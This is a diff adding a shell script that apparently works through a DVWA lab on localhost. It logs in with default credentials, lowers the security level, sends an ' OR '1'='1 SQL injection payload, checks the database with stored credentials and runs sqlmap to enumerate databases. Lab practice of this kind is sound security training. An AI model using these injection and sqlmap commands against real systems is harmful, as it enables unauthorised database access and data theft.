@@ -1,0 +1,32 @@
+cd ~
+pwd
+
+
+curl -s -c cookies.txt -d "username=admin&password=password&Login=Login" "http://127.0.0.1/dvwa/login.php" > /dev/null
+
+  ls -l cookies.txt
+grep -i PHPSESSID cookies.txt || cat cookies.txt
+
+
+  curl -s -b cookies.txt -c cookies.txt -d "security=low&seclev_submit=Submit" "http://127.0.0.1/dvwa/security.php" > /dev/null
+
+
+  grep -i security cookies.txt || cat cookies.txt
+
+
+  curl -s -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit" -o /tmp/sqli_test.html
+ls -l /tmp/sqli_test.html
+head -n 60 /tmp/sqli_test.html
+
+
+  xdg-open /tmp/sqli_test.html 2>/dev/null || echo "Open /tmp/sqli_test.html manually in the VM browser."
+
+
+  # show cookies and the exact status the server returns for the SQLi URL
+echo "---- cookies.txt ----"; sed -n '1,200p' cookies.txt
+echo "---- curl -I output ----"; curl -s -I -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,40p'
+
+
+mysql -u dvwauser -p -D dvwa -e "SHOW TABLES;"   # enter dvwapass when prompted
+
+  sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -b cookies.txt -p id --batch --level=3 --risk=2 --dbs | tee sqlmap-dbs.txt
